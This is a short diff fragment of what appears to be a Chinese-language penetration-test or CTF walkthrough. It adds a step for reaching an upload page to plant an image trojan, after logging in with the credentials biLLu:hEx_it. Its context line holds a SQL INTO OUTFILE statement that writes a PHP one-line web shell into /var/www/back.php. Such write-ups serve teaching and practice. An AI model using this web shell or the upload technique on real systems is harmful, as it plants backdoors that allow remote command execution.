@@ -529,3 +529,4 @@ select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/back.php'
 
 ### 6.2上传图片马
 使用口令biLLu：hEx\_it登入index.php跳转到panel.php页面  
+选择Add user -> continue 来到upload功能  
